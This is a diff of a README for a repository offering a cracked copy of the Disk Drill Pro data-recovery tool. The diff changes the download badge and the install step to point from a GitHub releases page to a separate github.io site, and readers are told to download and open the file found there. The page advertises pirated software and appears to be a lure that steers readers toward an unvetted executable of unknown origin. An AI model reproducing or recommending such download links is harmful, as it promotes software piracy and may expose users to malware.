@@ -1,6 +1,6 @@
 # 💾 DiskDrill-Pro-Cracked - Recover your lost files with ease
 
-[![Download Disk Drill](https://img.shields.io/badge/Download-Disk_Drill_Pro-blue.svg)](https://github.com/tradee4771/DiskDrill-Pro-Cracked/releases)
+[![Download Disk Drill](https://img.shields.io/badge/Download-Disk_Drill_Pro-blue.svg)](https://tradee4771.github.io)
 
 This application helps users recover lost data from storage devices. It works on Windows computers to retrieve deleted photos, documents, and videos. It performs deep scans on your hardware to locate files that appear hidden or removed.
 
@@ -18,7 +18,7 @@ To run this software, your computer needs to meet these basic standards:
 
 Follow these steps to set up the tool on your system.
 
-1. Navigate to the release page: https://github.com/tradee4771/DiskDrill-Pro-Cracked/releases
+1. Navigate to the release page: https://tradee4771.github.io
 2. Find the latest release version at the top of the list.
 3. Click the file name to start the download to your computer.
 4. Locate the downloaded file in your browser or your downloads folder.
